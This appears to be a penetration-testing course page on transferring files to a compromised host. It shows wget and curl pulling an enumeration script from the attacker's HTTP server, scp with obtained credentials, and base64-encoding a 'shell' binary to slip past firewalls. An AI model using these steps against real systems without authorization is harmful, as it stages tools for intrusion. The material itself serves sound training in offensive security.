# Transferring Files

## wget or cURL

Start our HTTP server in the directory of the files we want to upload:

```bash
$ cd /tmp
$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
```

On the remote machine, download our file with `wget`:

```bash
$ wget http://10.10.14.1:8000/linenum.sh

Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```

Or with `cURL`:

```bash
$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

## SCP

Another method to transfer files would be using scp, granted we have obtained ssh user credentials on the remote host. We can do so as follows:

```bash
$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

## base64

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it:

```bash
$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgAB...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

We can then paste the encoded data and decode it on the remote machine:

```bash
$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgAB...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

## Validating Files

To validate the format of a file, we can run the `file` command on it and/or check the hash:

```bash
$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header

$ md5sum shell
321de1d7e7c3735838890a72c9ae7d1d shell
```

Compare the `md5sum` output with the equivalent output on the host machine and they should match if the file was transferred successfully.
